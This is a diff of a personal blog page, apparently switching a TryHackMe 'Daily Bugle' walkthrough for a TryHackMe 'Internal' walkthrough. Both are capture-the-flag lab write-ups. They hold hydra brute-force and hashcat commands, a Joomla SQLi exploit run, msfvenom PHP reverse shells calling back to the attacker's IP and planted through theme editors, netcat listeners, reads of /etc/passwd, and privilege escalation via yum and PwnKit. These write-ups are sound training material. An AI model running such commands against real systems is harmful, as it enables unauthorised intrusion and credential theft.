@@ -30,24 +30,24 @@
 
   <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.3.4" />
-<meta property="og:title" content="TryHackMe Daily Bugle" />
+<meta property="og:title" content="TryHackMe Internal" />
 <meta property="og:locale" content="en" />
 <meta name="description" content="Solutions to CTFs and articles regarding cybersecurity." />
 <meta property="og:description" content="Solutions to CTFs and articles regarding cybersecurity." />
-<link rel="canonical" href="https://jason-kenyon.com/posts/daily_bugle/" />
-<meta property="og:url" content="https://jason-kenyon.com/posts/daily_bugle/" />
+<link rel="canonical" href="https://jason-kenyon.com/posts/internal/" />
+<meta property="og:url" content="https://jason-kenyon.com/posts/internal/" />
 <meta property="og:site_name" content="Jason’s Page" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2025-01-03T00:00:00-05:00" />
+<meta property="article:published_time" content="2025-01-08T00:00:00-05:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="TryHackMe Daily Bugle" />
+<meta property="twitter:title" content="TryHackMe Internal" />
 <meta name="twitter:site" content="@" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-01-03T00:00:00-05:00","datePublished":"2025-01-03T00:00:00-05:00","description":"Solutions to CTFs and articles regarding cybersecurity.","headline":"TryHackMe Daily Bugle","mainEntityOfPage":{"@type":"WebPage","@id":"https://jason-kenyon.com/posts/daily_bugle/"},"url":"https://jason-kenyon.com/posts/daily_bugle/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-01-08T00:00:00-05:00","datePublished":"2025-01-08T00:00:00-05:00","description":"Solutions to CTFs and articles regarding cybersecurity.","headline":"TryHackMe Internal","mainEntityOfPage":{"@type":"WebPage","@id":"https://jason-kenyon.com/posts/internal/"},"url":"https://jason-kenyon.com/posts/internal/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
-  <title>TryHackMe Daily Bugle | Jason's Page
+  <title>TryHackMe Internal | Jason's Page
   </title>
 
   <!--
@@ -299,7 +299,7 @@
         
           
             
-              <span>TryHackMe Daily Bugle</span>
+              <span>TryHackMe Internal</span>
             
 
           
@@ -626,6 +626,69 @@
     <!-- combine -->
     
   
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
 
   
 
@@ -676,7 +739,7 @@
 
 <article class="px-1" data-toc="false">
   <header>
-    <h1 data-toc-skip>TryHackMe Daily Bugle</h1>
+    <h1 data-toc-skip>TryHackMe Internal</h1>
     
 
     <div class="post-meta text-muted">
@@ -693,13 +756,13 @@
 
 <time
   
-  data-ts="1735880400"
+  data-ts="1736312400"
   data-df="ll"
   
     data-bs-toggle="tooltip" data-bs-placement="bottom"
   
 >
-  Jan  3, 2025
+  Jan  8, 2025
 </time>
 
       </span>
@@ -748,9 +811,9 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="785 words"
+  title="1060 words"
 >
-  <em>4 min</em> read</span>
+  <em>5 min</em> read</span>
 
         </div>
       </div>
@@ -760,75 +823,49 @@
   
 
   <div class="content">
-    <p><a href="/assets/img/daily_bugle/daily_bugle.png" class="popup img-link  shimmer"><img src="/assets/img/daily_bugle/daily_bugle.png" alt="" loading="lazy"></a></p>
+    <p><a href="/assets/img/internal/internal.jpeg" class="popup img-link  shimmer"><img src="/assets/img/internal/internal.jpeg" alt="" loading="lazy"></a></p>
 
 <h1 id="information-gathering">Information Gathering</h1>
-<p>We are instructed as follows:</p>
+<p>We are briefed:</p>
 
 <blockquote>
-  <p>Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.</p>
+  <p>You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks.</p>
+
+  <p>Scope of Work</p>
+
+  <p>The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:</p>
+
+  <p>User.txt
+Root.txt
+Additionally, the client has provided the following scope allowances:</p>
+
+  <p>Ensure that you modify your hosts file to reflect internal.thm
+Any tools or techniques are permitted in this engagement
+Locate and note all vulnerabilities found
+Submit the flags discovered to the dashboard
+Only the IP address assigned to your machine is in scope
+(Roleplay off)</p>
+
+  <p>I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field.</p>
+
+  <p>Note - this room can be completed without Metasploit</p>
+
+  <p><strong>Writeups will not be accepted for this room.</strong></p>
 </blockquote>
 
-<p>And we are given the target IP address <code class="language-plaintext highlighter-rouge">10.10.89.186</code>.</p>
+<p>The target IP address is <code class="language-plaintext highlighter-rouge">10.10.179.181</code>.</p>
 
-<p>Our objectives are to</p>
+<p>Our objectives are to:</p>
 
 <ol>
-  <li>determine who robbed the bank,</li>
-  <li>identify the version of Joomla running on the web server,</li>
-  <li>obtain the user flag, and</li>
-  <li>obtain the root flag.</li>
+  <li>locate and obtain the <code class="language-plaintext highlighter-rouge">User.txt</code> file,</li>
+  <li>locate and obtain the <code class="language-plaintext highlighter-rouge">Root.txt</code> file,</li>
+  <li>document all vulnerabilities found, and</li>
+  <li>provide remediation suggestions.</li>
 </ol>
 
 <h1 id="enumeration">Enumeration</h1>
-<p>We begin with an <code class="language-plaintext highlighter-rouge">nmap</code> scan <code class="language-plaintext highlighter-rouge">nmap -sS -T5 -sC -sV 10.10.89.186</code>, revealing</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-</pre></td><td class="rouge-code"><pre>PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
-| ssh-hostkey:
-|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
-|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
-|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
-80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
-|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
-| http-robots.txt: 15 disallowed entries
-| /joomla/administrator/ /administrator/ /bin/ /cache/
-| /cli/ /components/ /includes/ /installation/ /language/
-|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
-|_http-generator: Joomla! - Open Source Content Management
-|_http-title: Home
-3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>Upon navigating to the web server on port <code class="language-plaintext highlighter-rouge">80/TCP</code>, the front-page article discloses that it was “Spider-Man” who
-robbed the bank.</p>
-
-<p>Fuzzing for directories with</p>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-</pre></td><td class="rouge-code"><pre>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
--u http://10.10.121.232/FUZZ -ic
-</pre></td></tr></tbody></table></code></div></div>
-<p>yields</p>
+<p>We begin with the nmap scan <code class="language-plaintext highlighter-rouge">nmap -T5 -A -O 10.10.179.181</code>, which reveals</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
         <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
@@ -849,28 +886,49 @@ robbed the bank.</p>
 15
 16
 17
-</pre></td><td class="rouge-code"><pre>images                  [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 118ms]
-                        [Status: 200, Size: 9259, Words: 441, Lines: 243, Duration: 223ms]
-media                   [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 102ms]
-templates               [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 102ms]
-modules                 [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 98ms]
-bin                     [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 99ms]
-plugins                 [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 97ms]
-includes                [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 99ms]
-language                [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 98ms]
-components              [Status: 301, Size: 240, Words: 14, Lines: 8, Duration: 100ms]
-cache                   [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 100ms]
-libraries               [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 98ms]
-tmp                     [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 99ms]
-layouts                 [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 102ms]
-administrator           [Status: 301, Size: 243, Words: 14, Lines: 8, Duration: 95ms]
-cli                     [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 104ms]
-                        [Status: 200, Size: 9259, Words: 441, Lines: 243, Duration: 218ms]
-</pre></td></tr></tbody></table></code></div></div>
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre></td><td class="rouge-code"><pre>Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-08 08:15 EST
+Nmap scan report for 10.10.179.181
+Host is up (0.10s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
+|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
+|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4.15
+OS details: Linux 4.15
+Network Distance: 4 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-<p>To determine the Joomla version, we happen upon the web page <a href="https://docs.joomla.org/How_to_check_the_Joomla_version%3F">https://docs.joomla.org/How_to_check_the_Joomla_version%3F</a>, which suggests that we visit the URL 
-<code class="language-plaintext highlighter-rouge">http://10.10.89.186/languages/en-GB/en-GB.xml</code>. However, this endpoint does not exist; instead, we visit
-<code class="language-plaintext highlighter-rouge">http://10.10.89.186/language/en-GB/en-GB.xml</code>, upon which we find</p>
+TRACEROUTE (using port 5900/tcp)
+HOP RTT       ADDRESS
+1   32.75 ms  10.6.0.1
+2   ... 3
+4   102.60 ms 10.10.179.181
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.31 seconds
+</pre></td></tr></tbody></table></code></div></div>
+<p>Immediately, we notice the default page for an Apache web server.</p>
+
+<p>We then fuzz for directories using the command <code class="language-plaintext highlighter-rouge">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.179.181/FUZZ -ic</code>. This outputs</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
         <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
@@ -878,66 +936,161 @@ cli                     [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 
 2
 3
 4
-</pre></td><td class="rouge-code"><pre>&lt;metafile version="3.7" client="site"&gt;
-&lt;name&gt;English (en-GB)&lt;/name&gt;
-&lt;version&gt;3.7.0&lt;/version&gt;
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre>...
+wordpress               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 97ms]
+blog                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 4360ms]
+                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 4383ms]
+javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 97ms]
+phpmyadmin              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 96ms]
+                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 97ms]
+server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 97ms
 ...
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>Hence, we conclude that the web server is running Joomla version <code class="language-plaintext highlighter-rouge">3.7.0</code>.</p>
+<p>We notice that some of the functionality use by the web application uses the domain name <code class="language-plaintext highlighter-rouge">internal.thm</code> to refer to the target,
+so we add the entry <code class="language-plaintext highlighter-rouge">10.10.179.181 internal.thm</code> to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>
+
+<p>Our initial observation is that
+the wordpress login provides different output when a failed authentication attempt is made with a valid username than it does
+when an invalid username is used, simplifying authentication bypass. Moreover, the <code class="language-plaintext highlighter-rouge">phpmyadmin</code> portal is accessible to the outside world. This is completely unnecessary and poses significant security risks.</p>
+
+<p>Upon navigating to the endpoint <code class="language-plaintext highlighter-rouge">http://internal.thm/wordpress/</code> and clicking on the <code class="language-plaintext highlighter-rouge">Entries Feed</code> tab, we automatically
+download a file named <code class="language-plaintext highlighter-rouge">n-T86yJG</code> containing XML data to be used by RSS readers.</p>
+
+<p><a href="/assets/img/internal/wordpresslink.png" class="popup img-link  shimmer"><img src="/assets/img/internal/wordpresslink.png" alt="" loading="lazy"></a></p>
+
+<p>This file contains the line
+<code class="language-plaintext highlighter-rouge">&lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;</code>, which indicates that the web server is using wordpress version
+5.4.2. This is an information disclosure vulnerability, but it may be necessary for RSS to function properly in this case.</p>
+
+<p>We also note that users can post comments anonymously, which makes this page vulnerable to injection attacks such as XSS.</p>
 
 <h1 id="exploitation">Exploitation</h1>
-<p>We find CVE-2017-8917 after some research. We also find a python implementation at <a href="https://github.com/XiphosResearch/exploits/tree/master/Joomblah">https://github.com/XiphosResearch/exploits/tree/master/Joomblah</a>.
-Next, we clone the repository with<br />
-<code class="language-plaintext highlighter-rouge">git clone https://github.com/XiphosResearch/exploits/tree/master</code>. Running
-the exploit with <code class="language-plaintext highlighter-rouge">python3 joomblah.py http://10.10.89.186/</code> outputs</p>
+<p>We opt to perform a brute force attack on the wordpress login form with the command</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>hydra 10.10.179.181 -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/blog/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&amp;testcookie=1:F=Lost your password?"
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>We quickly find the password is <code class="language-plaintext highlighter-rouge">my2boys</code> and login. Afterward, we generate a php reverse shell using the command
+<code class="language-plaintext highlighter-rouge">msfvenom -p php/reverse_php LHOST=10.6.4.176 LPORT=6969 -o shell.php</code>, navigate to the theme editor, and copy the contents
+of <code class="language-plaintext highlighter-rouge">shell.php</code> into the active theme’s <code class="language-plaintext highlighter-rouge">index.php</code> file.</p>
+
+<p><a href="/assets/img/internal/theme.png" class="popup img-link  shimmer"><img src="/assets/img/internal/theme.png" alt="" loading="lazy"></a></p>
+
+<p>Then, we set up a netcat listener with <code class="language-plaintext highlighter-rouge">nc -lvnp 6969</code> and navigate to <code class="language-plaintext highlighter-rouge">http://internal.thm/blog/</code>. 
+Consequently, we receive a shell as <code class="language-plaintext highlighter-rouge">www-data</code>.</p>
+
+<h1 id="post-exploitation">Post-Exploitation</h1>
+<p>To identify the local users on the system we exectute <code class="language-plaintext highlighter-rouge">cat /etc/passwd</code> and receive</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
         <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
-</pre></td><td class="rouge-code"><pre>[$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com',
-'$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre></td><td class="rouge-code"><pre>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>To crack the hash, we create a file <code class="language-plaintext highlighter-rouge">hash.txt</code> and copy into it the hash <code class="language-plaintext highlighter-rouge">$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm</code>. We then go to the web page <code class="language-plaintext highlighter-rouge">https://hashes.com/en/tools/hash_identifier</code> and use the provided
-tool to discover that the hash type is<br />
-<code class="language-plaintext highlighter-rouge">bcrypt $2*$, Blowfish (Unix)</code>. By running <code class="language-plaintext highlighter-rouge">hashcat --help</code>, we find that
-the hash mode for this hash is <code class="language-plaintext highlighter-rouge">3200</code>. Then, we pass the file, along with the <code class="language-plaintext highlighter-rouge">rockyou.txt</code> wordlist, to hashcat
-to perform a dictionary attack with the command</p>
+<p>In attempt to locate the user flag, we run <code class="language-plaintext highlighter-rouge">find / -type f -iname 'user.txt' 2&gt;/dev/null</code>, but find the file 
+<code class="language-plaintext highlighter-rouge">/usr/share/doc/phpmyadmin/html/_sources/user.txt</code>, which is not a flag. Likely, we need a user with different read permissions
+than <code class="language-plaintext highlighter-rouge">www-data</code>.</p>
 
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+<p>While performing some manual enumeration, we list the contents of the <code class="language-plaintext highlighter-rouge">/opt</code> directory and find the file <code class="language-plaintext highlighter-rouge">wp-save.txt</code>. The
+contents of this file are as follows:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>hashcat <span class="nt">-D</span> 2 <span class="nt">-a</span> 0 <span class="nt">-m</span> 3200 hash.txt /usr/share/wordlists/rockyou.txt
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>Bill,
+
+Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
+
+aubreanna:&lt;DOITURSELF:)&gt;
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>This quickly reveals Jonah’s cracked password.</p>
+<p>With <code class="language-plaintext highlighter-rouge">ssh aubreanna@10.10.179.181</code>, we are able to successfully authenticate with the aforementioned password. This allows
+us to capture the user flag:</p>
 
-<p>With this password, we sign in to the Joomla administrative panel at <code class="language-plaintext highlighter-rouge">http://10.10.89.186/administrator</code> as
-the user <code class="language-plaintext highlighter-rouge">jonah</code>, and we generate a php web shell using<br />
-<code class="language-plaintext highlighter-rouge">msfvenom -p php/reverse_php -o shell.php LHOST=10.6.4.176</code>.</p>
+<p><a href="/assets/img/internal/user.txt.png" class="popup img-link  shimmer"><img src="/assets/img/internal/user.txt.png" alt="" loading="lazy"></a></p>
 
-<p>To upload the file, we navigate to the <code class="language-plaintext highlighter-rouge">Templates</code> tab and modify the Protostar
-template by copying into <code class="language-plaintext highlighter-rouge">index.php</code> the contents from our shell, <code class="language-plaintext highlighter-rouge">shell.php</code>.</p>
+<p>Running <code class="language-plaintext highlighter-rouge">find / -type f -iname 'root.txt' 2&gt;/dev/null</code> gives us no results, so we will have to elevate privileges even 
+further to obtain the root flag.</p>
 
-<p><a href="/assets/img/daily_bugle/templates.png" class="popup img-link  shimmer"><img src="/assets/img/daily_bugle/templates.png" alt="" loading="lazy"></a></p>
+<p>Running linpeas on the machine indicates that it is vulnerable to CVE-2021-4034. We use the exploit at <a href="https://github.com/ly4k/PwnKit">https://github.com/ly4k/PwnKit</a>
+and gain root. As root, we rerun the previous <code class="language-plaintext highlighter-rouge">find</code> command and locate the root flag <code class="language-plaintext highlighter-rouge">/home/root/root.txt</code>.</p>
 
-<p>Afterward, we 
-set up a netcat listener with <code class="language-plaintext highlighter-rouge">ncat -lvnp 4444</code> and navigate to <code class="language-plaintext highlighter-rouge">http://10.10.89.186/index.php</code>.
-This gives us a shell as <code class="language-plaintext highlighter-rouge">apache</code>.</p>
+<p><a href="/assets/img/internal/root.txt.png" class="popup img-link  shimmer"><img src="/assets/img/internal/root.txt.png" alt="" loading="lazy"></a></p>
 
-<h1 id="post-exploitation">Post-Exploitation</h1>
-<p>By executing <code class="language-plaintext highlighter-rouge">ls -al /home</code>, we notice that the only user with a home directory is <code class="language-plaintext highlighter-rouge">jjameson</code>, and that, unfortunately,
-we do not have read access to <code class="language-plaintext highlighter-rouge">/home/jjameson</code>. Nevertheless, we find a file named <code class="language-plaintext highlighter-rouge">configuration.php</code> in the web root directory <code class="language-plaintext highlighter-rouge">/var/www/html</code>, which contains the line<br />
-<code class="language-plaintext highlighter-rouge">public $password = 'DOITURSELF:)';</code>. This password allows us to sign in as <code class="language-plaintext highlighter-rouge">jjameson</code> with <code class="language-plaintext highlighter-rouge">ssh jjameson@10.10.89.186</code>. We are then able to capture the user flag:</p>
-
-<p><a href="/assets/img/daily_bugle/user.txt.png" class="popup img-link  shimmer"><img src="/assets/img/daily_bugle/user.txt.png" alt="" loading="lazy"></a></p>
-
-<p>Running <code class="language-plaintext highlighter-rouge">sudo -l</code>, we notice that we have sudo permissions for <code class="language-plaintext highlighter-rouge">yum</code> and use the the method demonstrated in part (b) 
-of the article at <a href="https://gtfobins.github.io/gtfobins/yum/">https://gtfobins.github.io/gtfobins/yum/</a> to obtain a root shell. With this shell, we capture the root flag:</p>
-
-<p><a href="/assets/img/daily_bugle/root.txt.png" class="popup img-link  shimmer"><img src="/assets/img/daily_bugle/root.txt.png" alt="" loading="lazy"></a></p>
 
   </div>
 
@@ -995,21 +1148,21 @@ of the article at <a href="https://gtfobins.github.io/gtfobins/yum/">https://gtf
 
       
 
-      <a href="https://twitter.com/intent/tweet?text=TryHackMe%20Daily%20Bugle%20-%20Jason's%20Page&url=https%3A%2F%2Fjason-kenyon.com%2Fposts%2Fdaily_bugle%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+      <a href="https://twitter.com/intent/tweet?text=TryHackMe%20Internal%20-%20Jason's%20Page&url=https%3A%2F%2Fjason-kenyon.com%2Fposts%2Finternal%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
         <i class="fa-fw fa-brands fa-square-x-twitter"></i>
       </a>
     
 
       
 
-      <a href="https://www.facebook.com/sharer/sharer.php?title=TryHackMe%20Daily%20Bugle%20-%20Jason's%20Page&u=https%3A%2F%2Fjason-kenyon.com%2Fposts%2Fdaily_bugle%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+      <a href="https://www.facebook.com/sharer/sharer.php?title=TryHackMe%20Internal%20-%20Jason's%20Page&u=https%3A%2F%2Fjason-kenyon.com%2Fposts%2Finternal%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
         <i class="fa-fw fab fa-facebook-square"></i>
       </a>
     
 
       
 
-      <a href="https://t.me/share/url?url=https%3A%2F%2Fjason-kenyon.com%2Fposts%2Fdaily_bugle%2F&text=TryHackMe%20Daily%20Bugle%20-%20Jason's%20Page" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+      <a href="https://t.me/share/url?url=https%3A%2F%2Fjason-kenyon.com%2Fposts%2Finternal%2F&text=TryHackMe%20Internal%20-%20Jason's%20Page" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
         <i class="fa-fw fab fa-telegram"></i>
       </a>
     
@@ -1191,31 +1344,31 @@ of the article at <a href="https://gtfobins.github.io/gtfobins/yum/">https://gtf
   
 
   
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
     
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
 
 
 
@@ -1229,40 +1382,6 @@ of the article at <a href="https://gtfobins.github.io/gtfobins/yum/">https://gtf
   <aside id="related-posts" aria-labelledby="related-label">
     <h3 class="mb-4" id="related-label">Further Reading</h3>
     <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
-      
-        <article class="col">
-          <a href="/posts/internal/" class="post-preview card h-100">
-            <div class="card-body">
-              <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-<time
-  
-  data-ts="1736312400"
-  data-df="ll"
-  
->
-  Jan  8, 2025
-</time>
-
-              <h4 class="pt-0 my-2">TryHackMe Internal</h4>
-              <div class="text-muted">
-                <p>Information Gathering
-We are briefed:
-
-
-  You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks.
-
-  Scope of W...</p>
-              </div>
-            </div>
-          </a>
-        </article>
       
         <article class="col">
           <a href="/posts/relevant/" class="post-preview card h-100">
@@ -1293,6 +1412,41 @@ We are given the following
   You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days.
 
   ...</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
+          <a href="/posts/daily_bugle/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1735880400"
+  data-df="ll"
+  
+>
+  Jan  3, 2025
+</time>
+
+              <h4 class="pt-0 my-2">TryHackMe Daily Bugle</h4>
+              <div class="text-muted">
+                <p>Information Gathering
+We are instructed as follows:
+
+
